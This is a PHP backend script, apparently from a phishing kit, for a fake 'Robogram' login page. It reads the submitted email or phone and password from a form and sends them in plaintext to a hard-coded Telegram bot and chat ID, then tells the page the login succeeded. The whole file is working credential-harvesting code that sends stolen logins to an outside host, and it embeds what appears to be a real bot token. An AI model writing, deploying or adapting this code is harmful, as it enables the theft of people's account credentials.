<?php
// Token dan chat_id disimpan di server, aman dari publik
$token = "8394244764:AAGJo0oW-lwaWd-WUoYSoctldXjg377KfPw";
$chat_id = "2040676419";

// Ambil data dari request POST
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

$message = "🔐 Login Robogram\n📧 Email/Telepon: $email\n🔑 Password: $password";

// Kirim ke Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $message
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Response untuk frontend
if ($result === FALSE) {
    echo json_encode(['status' => 'error']);
} else {
    echo json_encode(['status' => 'success']);
}
